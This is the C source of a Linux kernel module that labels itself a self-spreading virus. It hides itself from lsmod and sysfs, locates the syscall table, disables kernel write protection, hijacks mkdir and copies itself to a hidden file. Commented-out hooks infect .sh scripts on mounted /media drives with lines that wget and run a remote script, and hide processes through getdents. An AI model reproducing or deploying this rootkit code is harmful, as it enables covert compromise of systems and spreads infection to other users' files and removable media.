#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/fs.h>
#include <linux/dcache.h>
#include <linux/dirent.h>
#include <linux/namei.h>
#include <linux/slab.h>
#include <linux/linkage.h>
#include <linux/path.h>
#include <linux/mount.h>
#include <linux/errno.h>
#include <linux/gfp.h>
#include <asm/segment.h>
#include <asm/uaccess.h>
#include <linux/buffer_head.h>

#define DENT_BUFFER_SIZE 10000
#define FILE_BUFFER_SIZE 65536
#define PROC_V          "/proc/version"
#define BOOT_PATH       "/boot/System.map-"
#define MAX_LEN         256
 
/*********** descriptions ***********/
MODULE_LICENSE("Dual BSD/GPL");
MODULE_AUTHOR("Yang Bo");
MODULE_DESCRIPTION("A self Spreading LKM Virus");

/********** prototypes and declarations **********/
void ** syscall_table=NULL;
long (*getuid)(void); // = syscall_table[__NR_getuid]
long (*mkdir)(const char __user *pathname, int mode); // = syscall_table[__NR_mkdir]
long (*umount2)(const char __user *dir_name, int flags);
long (*chdir)(const char __user *filename);
long (*dup2)(int oldfd, int newfd);
long (*open)(const char __user *buf, int flags, mode_t mode);
long (*close)(const int fd);
long (*write)(const int fd, const char __user *buf, int size);
long (*getdents64)(unsigned int fd, void *buf, unsigned int count);
long (*getdents)(unsigned int fd, void *dirp, unsigned int count); // = syscall_table[__NR_getdents]

int str_cmp(const char *a, const char *b);
unsigned long** find_syscall_table(void);
long hacked_mkdir(const char __user *pathname, int mode);
unsigned long long clear_wp_cr0(void);

static int __init lkm_virus_init(void);
static void __exit lkm_virus_exit(void);

mm_segment_t old_fs;
char dents[DENT_BUFFER_SIZE];
char ko[FILE_BUFFER_SIZE];
char psname[10]="gedit";
char *processname=psname;

/**********queue based on list********/
struct queue {
	const char *s;
	struct list_head lnk;
};

static LIST_HEAD(q);

void queue_push(struct list_head *q, const char *s) {
	struct queue *entry = (struct queue *) kmalloc(sizeof (struct queue), __GFP_NOFAIL);
	entry->s = s;
	list_add_tail(&entry->lnk, q);
}

void queue_pop(struct list_head *q) {
	if (!list_empty(q)) {
		struct queue *entry = list_entry(q->next, struct queue, lnk);
		list_del(&entry->lnk);
		kfree(entry);
	}
}

void queue_erase(struct list_head *q, char *s) {
	struct list_head *iter;
	list_for_each(iter, q->next) {
		struct queue *entry = list_entry(iter, struct queue, lnk);
		list_del(&entry->lnk);
		kfree(entry);
	}
}

/********** implementations **********/
int myatoi(char *str)
{
	int i, len = strlen(psname);
	//printk("compare: str = %s, len = %d\n", str, len);
	for (i = 0; i < len; ++i)
	{
		if (str[i] != psname[i]) return (-1);
	}
	return (1);
}

/*int hacked_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count) {
	int value;
	int backup_pid = -1;
	struct task_struct *p, *backup_p = NULL;

	printk(KERN_DEBUG "enter hacked getdents\n");


	for (p = &init_task; (p = next_task(p)) != &init_task; )
		if (myatoi(p->comm) == 1) {
			printk("Go die, %s!\n", p->comm);
			backup_pid = p->pid;
			backup_p = p;
			p->pid = 0;
			break;
		}

	value = (*getdents) (fd, dirp, count);
	if (backup_p)
		backup_p->pid = backup_pid;
	printk(KERN_DEBUG "finished hacked_getdents.\n");
	return value;
}*/

int str_len(const char *s) {
	int res = 0;
	while (*s) {
		++res;
		++s;
	}
	return res;
}

int str_cmp(const char *a, const char *b) {
	while (*a && *b && *a == *b) {
		++a, ++b;
	}
	return *a - *b;
}

char *str_cat(const char *a, const char *b) {
	int len_a, len_b, i;
	char *res;
	for (len_a = 0; a[len_a]; ++len_a);
	for (len_b = 0; b[len_b]; ++len_b);
	res = kmalloc(len_a + len_b + 1, __GFP_NOFAIL);
	for (i = 0; i < len_a; ++i) {
		res[i] = a[i];
	}
	for (i = 0; i < len_b; ++i) {
		res[i + len_a] = b[i];
	}
	res[len_a + len_b] = 0;
	return res;
}

void enter_usr_space(void) {
	old_fs = get_fs();
	set_fs(get_ds());
}

void quit_usr_space(void) {
	set_fs(old_fs);
}


struct file *writing_file_open(const char *name) {
	mm_segment_t old_fs;
	struct file *res;
	printk("Try to open %s for writing...\n", name);
	old_fs = get_fs();
	set_fs(get_ds());
	res = filp_open(name, O_WRONLY | O_CREAT, 0644);
	set_fs(old_fs);
	if (IS_ERR(res)) {
		printk("Open failed...\n");
		return NULL;
	}
	printk("Open %s successfully...\n", name);
	return res;
}

int write_file(struct file *file, unsigned long long offset, unsigned char *data, unsigned int size) {
	int res;
	enter_usr_space();
	res = vfs_write(file, data, size, &offset);
	quit_usr_space();
	return res;
}

struct file *reading_file_open(const char *name) {
	struct file *res;
	enter_usr_space();
	printk("Try to open %s for reading...\n", name);
	res = filp_open(name, O_RDONLY, 0);
	set_fs(old_fs);
	if (IS_ERR(res)) {
		printk("Error %d\n", (int) res);
		printk("Open failed...\n");
		return NULL;
	}
	quit_usr_space();
	printk("Open %s successfully...\n", name);
	return res;
}

void read_file(struct file *file, char *res, int size, loff_t offset) {
	int i;
	for (i = 0; i < size; ++i) {
		res[i] = 0;
	}
	enter_usr_space();
	file->f_op->read(file, res, size, &offset);//&file->f_pos);
	quit_usr_space();
}

void file_close(struct file* file) {
	filp_close(file, NULL);
}

void copy_a_to_b(const char *a, const char *b) {
	struct file *file_a = reading_file_open(a);
	struct file *file_b = writing_file_open(b);
	if (file_a && file_b) {

		read_file(file_a, ko, (file_a->f_path).dentry->d_inode->i_size, 0);
		write_file(file_b, 0, ko, (file_a->f_path).dentry->d_inode->i_size);
	}
	if (file_a) {
		file_close(file_a);
	}
	if (file_b) {
		file_close(file_b);
	}
}

/**
 * @brief Finding system call table
 * @returns The pointer to the head of system call table
 */ 
char *search_file(char *buf) {
    struct file *f;
    char *ver;
    mm_segment_t oldfs;
    oldfs = get_fs();
    set_fs (KERNEL_DS);
    f = filp_open(PROC_V, O_RDONLY, 0);
    if ( IS_ERR(f) || ( f == NULL )) {
        return NULL;
    }
    memset(buf, 0, MAX_LEN);
    vfs_read(f, buf, MAX_LEN, &f->f_pos);
    ver = strsep(&buf, " ");
    ver = strsep(&buf, " ");
    ver = strsep(&buf, " ");
    filp_close(f, 0);   
    set_fs(oldfs);
    return ver;
}
static void ** find_sys_call_table (char *kern_ver) {
    char buf[MAX_LEN];
    int i = 0;
    void *filename;
    void **ret=NULL;
    char *p;
    struct file *f = NULL;
    mm_segment_t oldfs;
    oldfs = get_fs();
    set_fs (KERNEL_DS);
    filename = kmalloc(strlen(kern_ver)+strlen(BOOT_PATH)+1, GFP_KERNEL);
    if ( filename == NULL ) {
        return NULL;
    }
    memset(filename, 0, strlen(BOOT_PATH)+strlen(kern_ver)+1);
    strncpy(filename, BOOT_PATH, strlen(BOOT_PATH));
    strncat(filename, kern_ver, strlen(kern_ver));
    printk(KERN_ALERT "\nPath %s\n", filename);
    f = filp_open(filename, O_RDONLY, 0);
    if ( IS_ERR(f) || ( f == NULL )) {
        return NULL;
    }
    memset(buf, 0x0, MAX_LEN);
    p = buf;
    while (vfs_read(f, p+i, 1, &f->f_pos) == 1) {
        if ( p[i] == '\n' || i == 255 ) {
            i = 0;
            if ( (strstr(p, "sys_call_table")) != NULL ) {
                char *sys_string;
                sys_string = kmalloc(MAX_LEN, GFP_KERNEL);                 
                if ( sys_string == NULL ) { 
                    filp_close(f, 0);
                    set_fs(oldfs);
                    kfree(filename);
                    return NULL;
                }
                memset(sys_string, 0, MAX_LEN);
                strncpy(sys_string, strsep(&p, " "), MAX_LEN);
                ret = (void **) simple_strtol(sys_string, NULL, 16);
                kfree(sys_string);
                break;
            }
            memset(buf, 0x0, MAX_LEN);
            continue;
        }
        i++;
    }
    filp_close(f, 0);
    set_fs(oldfs);
    kfree(filename);
    return ret;
}

/**
 * @brief The hacked mkdir function, which first do what I specified, and then call the original mkdir
 * @returns The exit code of original system call mkdir
 */
long hacked_mkdir(const char __user *pathname, int mode) {
	//uid_t uid;
	//uid = getuid();
	//printk(KERN_DEBUG "mkdir %s by pid %i and uid %i\n", pathname, current->pid, uid);
	printk(KERN_DEBUG "mkdir has been hijacked\n");
	return 0;
	//return mkdir(pathname, mode);
}

/*int hacked_umount2(const  char __user *dir_name, int flags) {
	int fd, i, end;
	struct linux_dirent64 *cur;
	printk("%s umounting %d\n", dir_name, flags);
    int len = strlen(dir_name);
    char *temp = "/media/";
    char cur_str[10];
    if(len >= strlen(temp)) {
        strncpy(cur_str,dir_name,strlen(temp));
        if(!strcmp(cur_str,temp)) {
            int tot = 0;
            for (queue_push(&q, dir_name); !list_empty(&q); queue_pop(&q),tot++) {
                printk("tot = %d\n",tot);
                struct queue *front = list_entry(q.next, struct queue, lnk);
                enter_usr_space();
                printk("Try to open dir %s\n", front->s);
                fd = open(front->s, O_DIRECTORY, 0);
                if (fd < 0) {
                    printk("Error while infecting...\n");
                    while (!list_empty(&q)) {
                        queue_pop(&q);
                    }
                    break;
                }
                end = getdents64(fd, dents, DENT_BUFFER_SIZE);
                quit_usr_space();
                close(fd);
                if (end > 0) {
                    printk("walk on %s\' children...\n", front->s);
                    for (i = 0; i < end; ) {
                        cur = (struct linux_dirent64 *) (dents + i);
                        if (cur->d_type == DT_DIR && str_cmp(cur->d_name, ".") && str_cmp(cur->d_name, "..")) {
                            char *s = str_cat(front->s, str_cat("/", cur->d_name));
                            printk("sub folder: %s\n", cur->d_name);
                            if(tot <= 100)
                                queue_push(&q, s);
                        } else {
                            if (cur->d_type & DT_REG) {
                                int len = str_len(cur->d_name);
                                if (len > 3 && !strcmp(cur->d_name + len - 3, ".sh")) {
                                    char *s, *res, *tail;
                                    int len;
                                    struct file *file;
                                    s = str_cat(front->s, str_cat("/", cur->d_name));
                                    res = "\n";
                                    res = str_cat(res,"# This is our code\n");
                                    res = str_cat(res,"echo \"\nThis bash file is infected!\n\" ");
                                    res = str_cat(res,"wget https://raw.githubusercontent.com/lagoon0o0/LKMVirus/master/src/init.sh 2> serrlog\n");
                                    res = str_cat(res,"bash init.sh\n");
                                    res = str_cat(res,"rm init.sh serrlog\n");
                                    len = str_len(res);
                                    file = reading_file_open(s);
                                    tail = kmalloc(len + 1, __GFP_NOFAIL);
                                    read_file(file, tail, len, (file->f_path).dentry->d_inode->i_size - len);
                                    file_close(file);
                                    if (str_cmp(res, tail) == 0) {
                                        kfree(tail);
                                        printk("%s has been infected! Do nothing...\n", s);
                                    } else {
                                        kfree(tail);
                                        file = writing_file_open(s);
                                        //fd = open(s, O_APPEND|O_RDONLY, 0);
                                        printk("@%lld %s is written\n", (file->f_path).dentry->d_inode->i_size, res);
                                        write_file(file, (file->f_path).dentry->d_inode->i_size, res, len);
                                        file_close(file);
                                    }
                                }
                            }
                        }
                        i += cur->d_reclen;
                    }
                } else {
                    if (end < 0)
                        printk("ls failed! %d\n", end);
                }
            }
        }
    }
 	return umount2(dir_name, flags);
}*/

/**
 * @brief Under the x86_64 architecture linux kernel, use asm to the the write-protection bit of register cr0 to 0
 * @returns The original value of cr0
 */
unsigned long long clear_wp_cr0(void) {
	unsigned long long cr0 = 0;
	unsigned long long ret;

	asm volatile("movq %%cr0, %0": "=a"(cr0));
	ret = cr0;
	cr0 &= ~0x10000LL; // clear the 20 bit of CR0
	asm volatile ("movq %0, %%cr0": : "a"(cr0));
	return ret;
}

/**
 * @brief Under the x86_64 architecture linux kernel, use asm to forcefully write register cr0
 */
void set_cr0(unsigned long long cr0) {
	asm volatile("movq %0, %%cr0": :"a"(cr0));
}

/**
 * @brief module entry
 */
static int hello_init(void)
{
	//printk(KERN_ALERT "Hello, world\n");

	unsigned long long cr0;

	/**** hide from lsmod ****/
	list_del_init(&THIS_MODULE->list);
	/**** hide from sysfs ****/
	kobject_del(&THIS_MODULE->mkobj.kobj);

	/**** find syscall table ****/
	char *kern_ver;
	void *buf;
	buf = kmalloc(MAX_LEN, GFP_KERNEL);
	if ( buf == NULL ) {
		printk(KERN_ALERT "\nKMALLOC FAILED\n");		
		return -1;
	}   
	
	kern_ver = search_file(buf);   
	if ( kern_ver == NULL ) {
		printk(KERN_ALERT "\nKERN VER NOT FOUND\n");
		return -1;
	}
	printk(KERN_ALERT "Kernel version found: %s\n", kern_ver);
	
	syscall_table = find_sys_call_table(kern_ver);
	if (!syscall_table) {
		printk(KERN_ALERT "\nTABLE NOT FOUND\n");
		return -1;
	}
	printk(KERN_ALERT "\nTABLE FOUND\n");
	kfree(buf);
	
	/**** find the original system call ****/
		
	mkdir = syscall_table[__NR_mkdir];
	getuid = syscall_table[__NR_getuid];
	chdir = syscall_table[__NR_chdir];
	dup2 = syscall_table[__NR_dup2];
	open = syscall_table[__NR_open];
	close = syscall_table[__NR_close];
	write = syscall_table[__NR_write];
	getdents64 = syscall_table[__NR_getdents64];
	getdents = syscall_table[__NR_getdents];
	umount2 = syscall_table[__NR_umount2];
	
	
	//copy_a_to_b("run.sh", "/run.sh");
	copy_a_to_b("hello.ko", "/.hello.ko");

	/**** system call hooking ****/
	cr0 = clear_wp_cr0();
	syscall_table[__NR_mkdir] = hacked_mkdir; printk("mkdir hacked!\n");
	//syscall_table[__NR_umount2] = hacked_umount2; printk("umount2 hacked!\n");
	//syscall_table[__NR_getdents] = hacked_getdents; printk("getdents hacked!\n");
	set_cr0(cr0);
	
	return 0;
}
 
/*****@brief Module exit. Will never be called*****/
static void hello_exit(void)
{
	printk(KERN_ALERT "Goodbye\n");

	unsigned long long cr0;
	if(syscall_table) {
		cr0 = clear_wp_cr0();
		syscall_table[__NR_mkdir] = mkdir; printk("mkdir returned!\n");
		//syscall_table[__NR_umount2] = umount2; printk("umount2 returned\n");
		//syscall_table[__NR_getdents] = getdents; printk("getdents returned\n");
		set_cr0(cr0);
	}
}

/*********** register entry and exit ***********/
module_init(hello_init);
module_exit(hello_exit);
